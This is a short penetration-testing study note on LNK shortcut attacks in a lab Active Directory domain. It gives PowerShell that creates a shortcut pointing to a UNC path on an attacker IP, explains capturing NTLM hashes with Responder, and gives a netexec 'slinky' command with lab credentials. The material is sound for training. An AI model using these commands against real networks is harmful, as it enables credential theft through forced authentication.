# LNK File Attacks



![Screenshot](./assets/166_LNK_File_Attacks_1cad64c5-e0cb-8021-bd76-e8258e76a838.png)

The following code will create a file for us

```plain text
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

If we have responder up and that file is triggered than it will capture a hash

Once the file is triggers if we run responder the hashes wil come flying


![Screenshot](./assets/167_LNK_File_Attacks_1cad64c5-e0cb-802c-a268-ca9e5d9d0b86.png)

we can use

![Screenshot](./assets/168_LNK_File_Attacks_1cad64c5-e0cb-8011-a7e2-d1a5c9daf313.png)

Additional resources for forced authentication: [https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)
Automated attack using CME/NetExec:
netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149


---
[Back to Attacking Active Directory: Post-Compromise Attacks ](./README.md)
